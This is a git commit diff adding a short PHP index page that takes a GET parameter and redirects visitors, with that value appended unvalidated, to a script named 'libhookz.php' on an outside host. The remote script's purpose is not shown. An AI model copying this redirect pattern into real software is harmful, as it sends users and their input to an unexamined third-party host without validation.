f3d9407f88a69cd26a01253b301030ea2d0d5014
SK3#3160 <66770178+SK3-4121@users.noreply.github.com>
2021-08-24 16:03:01 -0700

    Update index.php

--- src/index.php
+++ src/index.php
@@ -1,1 +1,9 @@
-New main index.php soon
+<?php
+    $Tag = "Milfs";
+    $Main_URL = "https://api.dolphin-fe.xyz/p/";
+
+    if ($_GET[$Tag]) {
+        $Img = $_GET[$Tag];
+        header("Location: " . $Main_URL . "lib/libhookz.php?" . $Tag . "=" . $Img);
+    }
+?>
